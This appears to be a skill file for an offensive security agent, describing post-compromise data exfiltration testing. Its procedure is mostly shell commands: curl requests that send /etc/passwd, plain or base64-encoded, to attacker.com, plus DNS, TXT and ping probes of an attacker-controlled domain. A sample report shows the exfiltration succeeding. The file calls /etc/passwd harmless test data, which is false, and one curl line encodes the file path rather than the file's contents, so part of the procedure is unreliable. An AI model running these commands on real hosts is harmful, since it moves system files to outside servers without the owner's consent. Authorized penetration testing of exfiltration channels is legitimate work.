---
name: data-exfil
description: Test data exfiltration capabilities from the compromised host
version: 1.0.0
phase: post
category: exfiltration
tags: [exfiltration, data, network]
tools: [curl, base64]
difficulty: basic
opsec_level: high
time_estimate: 15s
severity_if_found: high
related_skills:
  - credential-harvest
  - persistence
mitre_attack:
  - T1048.003
  - T1041
---

## When to Use

Use this skill to verify that data can be exfiltrated from the compromised
network. This confirms the attacker can extract stolen data.

## Prerequisites

- Shell access
- curl or wget
- Outbound network access

## Procedure

```bash
# Test DNS exfiltration
nslookup attacker-controlled-domain.com

# Test HTTP exfiltration
curl -sk "https://attacker.com/exfil?data=$(echo /etc/passwd | base64)"

# Test DNS tunneling capability
dig TXT attacker-controlled-domain.com

# Test ICMP exfiltration
ping -c 1 attacker-controlled-domain.com

# Test HTTPS exfiltration
curl -sk -X POST "https://attacker.com/exfil" -d @/etc/passwd
```

## OPSEC Rules

- **CRITICAL**: Do not actually exfiltrate real data
- Use test data only (e.g., /etc/passwd or harmless strings)
- Document exfiltration channels that work
- Do not transfer large files
- Clean up any test data sent

## Verification

- Verify the receiving server gets the data
- Check if exfiltration is blocked by firewall
- Confirm the channel works reliably

## Pitfalls

- DLP solutions may block exfiltration
- Firewall may block outbound connections
- DNS exfiltration may be slow and unreliable
- HTTPS exfiltration may be detected by IDS

## Output Format

```
[EXFIL] HTTP exfiltration successful
  Method: POST to https://attacker.com/exfil
  Data: /etc/passwd (base64 encoded)
  Severity: HIGH
  Evidence: Data received by attacker server

[EXFIL] DNS exfiltration possible
  Method: TXT records to attacker-domain.com
  Severity: MEDIUM
```
